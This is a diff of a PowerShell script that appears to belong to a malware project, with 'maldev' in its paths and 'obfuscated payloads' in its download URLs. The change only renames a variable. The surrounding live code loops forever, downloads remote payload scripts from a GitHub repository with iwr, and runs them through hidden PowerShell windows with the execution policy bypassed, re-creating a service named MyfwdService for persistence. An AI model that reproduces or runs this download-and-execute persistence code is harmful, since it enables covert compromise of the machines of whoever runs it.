@@ -10,7 +10,7 @@ $paths = @(
     "$env:windir\System32\drivers\etc",
     "$env:windir\System32\LogFiles\WMI"
 )
-$basePath = $basePath -replace '([{}])', '`$1'
+$b = $basePath -replace '([{}])', '`$1'
 echo $basePath >> "C:\Users\maldev\Downloads\fwd_mon.txt"
 $serviceName = "MyfwdService"
 $propertyName = "fwd"
@@ -76,12 +76,12 @@ while ($true) {
         }
         iwr -Uri "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/obfuscated%20payloads/f.ps1" -OutFile $fwdPath
         iwr -Uri "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/payloads/init_service_fwd.ps1" -OutFile $initServicefwdPath
-        powershell.exe -ep bypass -noP -w hidden $initServicefwdPath -basePath "$basePath" -fwdPath $fwdPath
+        powershell.exe -ep bypass -noP -w hidden $initServicefwdPath -basePath "$b" -fwdPath $fwdPath
     }
 
     elseif($x -or $y){
         iwr -Uri "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/payloads/init_service_fwd.ps1" -OutFile $initServicefwdPath
-        powershell.exe -ep bypass -noP -w hidden $initServicefwdPath -basePath "$basePath" -fwdPath $fwdPath
+        powershell.exe -ep bypass -noP -w hidden $initServicefwdPath -basePath "$b" -fwdPath $fwdPath
     }
     $issetup = $false
 }
